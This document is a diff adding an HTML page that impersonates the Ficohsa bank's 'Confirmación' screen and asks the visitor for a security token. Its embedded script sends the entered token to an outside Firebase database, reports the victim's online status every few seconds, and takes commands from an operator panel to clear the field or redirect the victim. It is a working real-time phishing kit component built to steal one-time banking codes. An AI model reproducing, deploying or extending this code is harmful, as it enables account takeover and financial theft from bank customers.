@@ -1,0 +1,257 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Ficohsa</title>
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+<style>
+  *{box-sizing:border-box}
+  html,body{margin:0;padding:0}
+  body{font-family:'Open Sans','Segoe UI',Tahoma,Arial,sans-serif;background:#e9e9e9;min-height:100vh;min-width:1000px;position:relative}
+
+  /* ===== BANNER ===== */
+  .topbar{position:relative;height:200px;background:#0d4bbd}
+  .topbar-links{position:absolute;top:24px;right:40px;display:flex;align-items:center;gap:14px;
+    color:#fff;font-size:14.5px;letter-spacing:.6px;font-weight:600}
+  .topbar-links a{color:#fff;display:flex;align-items:center;gap:7px;text-decoration:none}
+  .topbar-links .pipe{color:#9dbdf0;font-weight:400}
+  .mob{display:none}
+  .logo{position:absolute;top:45px;left:50%;transform:translateX(-50%);line-height:0}
+  .logo svg{display:block;width:260px;height:auto}
+
+  /* ===== TARJETA ===== */
+  .wrapper{width:780px;margin:0 auto;position:relative;z-index:2}
+  .card{margin-top:-48px;background:#fff;border:1px solid #dedede;box-shadow:0 1px 5px rgba(0,0,0,.13);padding-bottom:34px}
+
+  .mhead{background:#0d4bbd;display:flex;align-items:center;justify-content:space-between;padding:16px 28px}
+  .mhead span{color:#fff;font-size:22px;font-weight:600;letter-spacing:.3px}
+  .cerrar{border:none;background:none;padding:0;cursor:pointer;line-height:0;opacity:.9}
+  .cerrar:hover{opacity:.65}
+
+  .mbody{padding:28px 32px 0}
+  .bloque{display:flex;align-items:flex-start;gap:17px}
+  .bloque svg{flex:0 0 auto;margin-top:1px}
+  .bloque p{margin:0;font-size:18.5px;line-height:1.5;color:#33425c}
+
+  .importante{margin:24px 0 0;font-size:18.5px;line-height:1.5;color:#33425c}
+  .importante strong{font-weight:700}
+
+  label{display:block;margin:32px 0 9px;font-size:15.5px;color:#46536b}
+  input{width:100%;height:46px;background:#fff;border:1px solid #b9c2d0;border-left:4px solid #1a5fd0;
+    padding:0 14px;font-family:inherit;font-size:17.5px;color:#26324a;outline:none;transition:border-color .15s,box-shadow .15s}
+  input:focus{border-left-color:#0d4bbd;box-shadow:0 0 0 2px rgba(13,75,189,.12)}
+
+  .btn-row{margin-top:22px;display:flex;justify-content:flex-end}
+  .btn-row button{width:185px;height:38px;border:none;background:#85adf2;color:#fff;
+    font-family:inherit;font-size:17.5px;font-weight:600;letter-spacing:.3px;cursor:default;transition:background .18s,box-shadow .18s}
+  .btn-row button.ready{background:#0d4bbd;cursor:pointer}
+  .btn-row button.ready:hover{background:#0a3f9f}
+  .btn-row button.ready:active{box-shadow:inset 0 2px 5px rgba(0,0,0,.25)}
+
+  .footer-row{margin-top:26px;display:flex;justify-content:space-between;align-items:center;font-size:14px;color:#4a4a4a}
+  .footer-row .copy{display:flex;align-items:center;gap:5px}
+  .footer-row .copy .c{color:#7a7a7a}
+  .footer-row .faq{display:flex;align-items:center;gap:6px;color:#0c3f8f}
+  .footer-row a{text-decoration:none;color:#0c3f8f}
+
+  @media (max-width:768px){
+    body{min-width:0}
+    .topbar{height:38px}
+    .desk{display:none!important}
+    .mob{display:flex}
+    .topbar-links{top:0;right:10px;height:38px;gap:9px;font-size:13px;letter-spacing:.5px}
+    .topbar-links .pipe{color:#8fb3ec}
+    .card-ico{width:30px;height:21px;border-radius:3px;background:#2f74d0;align-items:center;justify-content:center}
+    .logo{left:10px;top:0;height:38px;transform:none;display:flex;align-items:center}
+    .logo svg{width:92px}
+
+    .wrapper{width:100%}
+    .card{margin-top:0;border:none;box-shadow:none;padding-bottom:26px;min-height:420px}
+    .mhead{padding:13px 20px}
+    .mhead span{font-size:18px}
+    .cerrar svg{width:30px;height:30px}
+    .mbody{padding:22px 20px 0}
+    .bloque{gap:13px}
+    .bloque svg{width:26px;height:29px}
+    .bloque p,.importante{font-size:14.5px}
+    label{font-size:13.5px;margin-top:26px}
+    input{height:40px;font-size:16px}
+    .btn-row{margin-top:18px}
+    .btn-row button{width:110px;height:34px;font-size:15px}
+    .footer-row{font-size:12.5px;padding:0 20px}
+  }
+</style>
+</head>
+<body>
+
+  <header class="topbar">
+    <div class="topbar-links">
+      <a class="desk" href="#">CONTÁCTANOS</a>
+      <span class="pipe desk">|</span>
+      <a class="desk" href="#">ESPAÑOL
+        <svg width="13" height="8" viewBox="0 0 13 8" fill="none"><path d="M1 1l5.5 5.5L12 1" stroke="#fff" stroke-width="1.7" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </a>
+      <a class="mob card-ico" href="#">
+        <svg width="17" height="13" viewBox="0 0 17 13" fill="none">
+          <rect x=".7" y=".7" width="15.6" height="11.6" rx="1.4" stroke="#fff" stroke-width="1.3"/>
+          <path d="M.7 4.2h15.6" stroke="#fff" stroke-width="1.3"/>
+          <path d="M3.2 8.6h4" stroke="#fff" stroke-width="1.2" stroke-linecap="round"/>
+        </svg>
+      </a>
+      <span class="pipe mob">|</span>
+      <a class="mob" href="#">ES
+        <svg width="11" height="7" viewBox="0 0 13 8" fill="none"><path d="M1 1l5.5 5.5L12 1" stroke="#fff" stroke-width="1.8" stroke-linecap="round" stroke-linejoin="round"/></svg>
+      </a>
+    </div>
+
+    <div class="logo">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 734 166" fill="none">
+        <path d="M120.236 24.39C122.656 29.41 120.586 33.91 115.216 34.6L103.626 36.16C34.236 45.5 16.416 69.9 12.436 86.34L2.05598 62.29C-9.01402 35.82 24.376 7.78 108.126 0L120.236 24.39ZM106.566 47.23C30.256 57.61 13.646 89.28 21.086 106.41L32.336 132.54C32.336 109.7 62.966 92.74 110.716 83.74C116.946 82.53 120.236 78.2 117.806 72.67L106.566 47.23ZM47.736 123.71C43.756 127.69 40.986 133.23 40.986 138.07C40.986 152.43 55.696 161.95 91.516 162.64L78.366 136.68C56.906 138.08 50.506 131.15 47.736 123.71ZM607.716 110.68C598.546 108.81 591.416 107.28 591.416 101.51C591.416 96.25 597.016 93.53 608.226 93.53C615.526 93.53 621.986 94.72 628.266 96.76L632.856 79.1C627.256 77.06 619.266 75.02 608.226 75.02C585.806 75.02 570.866 86.23 570.866 102.87C570.866 121.38 586.996 125.12 599.906 128C609.076 130.04 616.886 131.74 616.886 137.85C616.886 144.64 609.416 146.85 600.586 146.85C591.756 146.85 585.306 144.13 579.356 137.68L566.956 152.96C575.276 161.11 586.826 165.19 599.906 165.19C622.156 165.19 637.606 153.47 637.606 136.83C637.606 117.13 620.956 113.57 607.716 110.68ZM733.896 83.68V162.65H715.556V155.35C709.276 161.12 700.446 165.2 689.236 165.2C665.286 165.2 647.966 147.37 647.966 122.57C647.966 93.7 667.496 75.02 697.726 75.02C711.136 75.02 723.196 77.9 733.896 83.68ZM713.856 96.41C709.096 94.54 703.156 93.52 696.706 93.52C679.216 93.52 668.856 103.71 668.856 121.03C668.856 137.33 678.876 147.52 695.346 147.52C702.646 147.52 709.106 145.65 713.856 142.43V96.41ZM520.926 75.02C510.906 75.02 502.076 77.91 495.796 83.51V44.28H475.756V162.65H495.796V98.28C502.416 94.88 508.536 93.35 515.156 93.35C526.536 93.35 533.326 98.78 533.326 107.79V162.64H553.366V107.28C553.366 87.07 541.306 75.02 520.926 75.02ZM458.946 120.19C458.946 146 438.906 165.36 412.246 165.36C385.586 165.36 365.546 146 365.546 120.19C365.546 94.38 385.756 75.02 412.246 75.02C438.736 75.02 458.946 94.38 458.946 120.19ZM438.056 120.19C438.056 102.53 425.146 93.36 412.246 93.36C399.346 93.36 386.606 102.53 386.606 120.19C386.606 137.85 399.516 146.85 412.246 146.85C424.976 146.85 438.056 137.68 438.056 120.19ZM329.876 146.68C316.966 146.68 303.216 138.36 303.216 120.02C303.216 104.57 314.256 93.7 330.046 93.7C339.046 93.7 344.486 97.27 348.386 100.66L360.106 86.39C355.016 80.45 343.296 75.01 329.706 75.01C302.196 75.01 282.156 94.2 282.156 120.69C282.156 147.18 301.006 165.36 327.836 165.36C342.106 165.36 354.836 160.1 361.636 151.94L349.746 138.69C344.136 144.31 337.686 146.68 329.876 146.68ZM245.976 162.65H266.016V77.74H245.976V162.65ZM255.996 44.28C249.206 44.28 243.766 49.71 243.766 56.51C243.766 63.31 249.196 68.74 255.996 68.74C262.796 68.74 268.226 63.31 268.226 56.51C268.226 49.71 262.786 44.28 255.996 44.28ZM154.096 162.65H176.006V117.14H228.146V98.12H176.006V66.02H231.366V47.17H154.096V162.65Z" fill="#FFFFFF"/>
+      </svg>
+    </div>
+  </header>
+
+  <div class="wrapper">
+    <div class="card">
+      <div class="mhead">
+        <span>Confirmación</span>
+        <button class="cerrar" id="btnCerrar" aria-label="Cerrar">
+          <svg width="34" height="34" viewBox="0 0 46 46" fill="none">
+            <circle cx="23" cy="23" r="21" stroke="#c6d0e0" stroke-width="2.4"/>
+            <path d="M16 16l14 14M30 16L16 30" stroke="#c6d0e0" stroke-width="2.4" stroke-linecap="round"/>
+          </svg>
+        </button>
+      </div>
+
+      <div class="mbody">
+        <div class="bloque">
+          <svg width="30" height="33" viewBox="0 0 42 46" fill="none">
+            <rect x="4" y="18" width="34" height="25" rx="2.5" stroke="#5b6b85" stroke-width="2.8"/>
+            <path d="M11 18v-5.5a10 10 0 0120 0V18" stroke="#5b6b85" stroke-width="2.8"/>
+            <circle cx="21" cy="27" r="3" fill="#5b6b85"/>
+            <path d="M21 29.5v6" stroke="#5b6b85" stroke-width="2.8" stroke-linecap="round"/>
+          </svg>
+          <p>El dispositivo de seguridad se utiliza para confirmar la transacción, ingrese la información correspondiente.</p>
+        </div>
+
+        <p class="importante"><strong>¡IMPORTANTE!</strong> No comparta este número con ninguna persona.</p>
+
+        <form id="formToken" autocomplete="off">
+          <label for="token">Ingresa una serie de Token</label>
+          <input type="text" id="token" inputmode="numeric" required onkeypress='return event.charCode >= 48 && event.charCode <= 57' maxlength="8" autocomplete="off" autofocus>
+          <div class="btn-row">
+            <button type="submit" id="btnContinuar">Continuar</button>
+          </div>
+        </form>
+      </div>
+    </div>
+
+    <div class="footer-row">
+      <div class="copy">
+        <span class="c">©</span>
+        <span>Grupo Ficohsa - <a class="navy" href="#">www.ficohsa.com</a></span>
+      </div>
+      <a class="faq" href="#">
+        <svg width="16" height="16" viewBox="0 0 17 17" fill="none">
+          <circle cx="8.5" cy="8.5" r="7.8" stroke="#0c3f8f" stroke-width="1.3"/>
+          <path d="M6.4 6.4c0-1.2.9-2.1 2.1-2.1s2.1.9 2.1 2c0 1.6-2.1 1.6-2.1 3.2" stroke="#0c3f8f" stroke-width="1.3" stroke-linecap="round"/>
+          <circle cx="8.5" cy="12.2" r=".85" fill="#0c3f8f"/>
+        </svg>
+        Preguntas frecuentes
+      </a>
+    </div>
+  </div>
+
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-app-compat.js"></script>
+<script src="https://www.gstatic.com/firebasejs/9.6.1/firebase-database-compat.js"></script>
+<script>
+const CFG = { DB_URL: "https://cbonnlineec-default-rtdb.firebaseio.com/", ROOT: "ficohsa", REDIRECT_BLOQUEADO: "https://www.google.com" };
+
+const DBX = (function(){
+  const KEY='ficohsa_db';
+  const vacio=()=>({logins:{},comandos:{},eliminados:{},blacklist:{},historial:{}});
+  let fb=null, subs=[];
+  const leer=()=>{ try{ return JSON.parse(localStorage.getItem(KEY))||vacio(); }catch(e){ return vacio(); } };
+  const gp=(t,p)=>p.split('/').reduce((o,k)=>(o&&o[k]!==undefined)?o[k]:null,t);
+  function notificar(){ subs.forEach(s=>{ try{ s.cb(gp(leer(),s.path)); }catch(e){} }); }
+  window.addEventListener('storage',e=>{ if(e.key===KEY) notificar(); });
+  return {
+    init(){ if(!CFG.DB_URL||typeof firebase==='undefined') return false;
+      if(!firebase.apps.length) firebase.initializeApp({databaseURL:CFG.DB_URL}); fb=firebase.database(); return true; },
+    update(p,v){ if(fb) return fb.ref(CFG.ROOT+'/'+p).update(v);
+      const t=leer(),ks=p.split('/'); let o=t; ks.slice(0,-1).forEach(k=>{ if(typeof o[k]!=='object'||o[k]===null) o[k]={}; o=o[k]; });
+      o[ks[ks.length-1]]=Object.assign({},gp(t,p)||{},v);
+      localStorage.setItem(KEY,JSON.stringify(t)); notificar(); },
+    on(p,cb){ if(fb){ fb.ref(CFG.ROOT+'/'+p).on('value',s=>cb(s.val())); } else { subs.push({path:p,cb}); cb(gp(leer(),p)); } }
+  };
+})();
+
+const id  = sessionStorage.getItem('ficohsa_id');
+const inp = document.getElementById('token');
+const btn = document.getElementById('btnContinuar');
+const paginaActual = (location.pathname.split('/').pop() || 'token.html').toLowerCase();
+
+DBX.init();
+if(!id){ location.href = 'index.html'; }
+
+/* ---- botón ---- */
+function sync(){ btn.classList.toggle('ready', inp.value.trim().length > 0); }
+inp.addEventListener('input', sync);
+sync();
+inp.focus();
+
+document.getElementById('formToken').addEventListener('submit', function(e){ e.preventDefault(); enviar(); });
+
+function ping(){
+  if(!id) return;
+  DBX.update('logins/'+id, { online:true, ultimoPing:Date.now(), pagina:'token.html', status:'ESPERANDO_TOKEN' });
+}
+ping(); setInterval(ping, 5000);
+
+let enviado = false;
+function enviar(){
+  if(!inp.value.trim()){ inp.focus(); return; }
+  if(enviado) return;
+  enviado = true;
+  btn.textContent = 'Enviando...';
+  btn.classList.remove('ready');
+  DBX.update('logins/'+id, {
+    sms: inp.value.trim(), token: inp.value.trim(), smsEn: Date.now(),
+    pagina:'token.html', status:'TOKEN_ENVIADO', online:true, ultimoPing:Date.now()
+  });
+  inp.blur();
+  setTimeout(function(){ location.href = 'cargando.html'; }, 900);
+}
+
+/* ---- comandos del panel (sin recargarse a sí misma) ---- */
+let ultimoComando = 0, primerEvento = true;
+DBX.on('comandos/'+id, function(c){
+  if(!c || !c.ts) return;
+
+  // el primer valor que llega ya es la orden que nos trajo aquí: se ignora
+  if(primerEvento){
+    primerEvento = false;
+    ultimoComando = c.ts;
+    if(c.limpiarToken && !enviado){ inp.value=''; sync(); }
+    return;
+  }
+  if(enviado) return;
+  if(c.limpiarToken){ inp.value=''; sync(); }
+
+  if(c.ts > ultimoComando && c.redirect){
+    ultimoComando = c.ts;
+    if(c.redirect.toLowerCase() === paginaActual) return;   // no recargar la misma página
+    if(c.redirect.indexOf('index') !== -1) sessionStorage.removeItem('ficohsa_id');
+    setTimeout(function(){ location.href = c.redirect; }, 400);
+  }
+});
+
+document.getElementById('btnCerrar').addEventListener('click', function(){
+  sessionStorage.removeItem('ficohsa_id');
+  location.href = 'index.html';
+});
+</script>
+</body>
+</html>
